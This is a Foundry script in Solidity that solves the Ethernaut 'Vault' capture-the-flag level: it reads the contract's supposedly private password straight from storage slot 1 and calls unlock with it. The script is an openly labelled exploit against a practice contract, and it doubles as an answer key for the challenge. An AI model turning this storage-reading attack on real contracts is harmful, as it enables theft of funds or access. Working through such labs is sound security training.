// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/08_Vault.sol";

contract ExploitScript is Script {

    Vault public level08 = Vault(your_challenge_address);

    function run() external {
        vm.startBroadcast();

        bytes32 password = vm.load(address(level08), bytes32(uint256(1)));
        level08.unlock(password);

        vm.stopBroadcast();
    }
}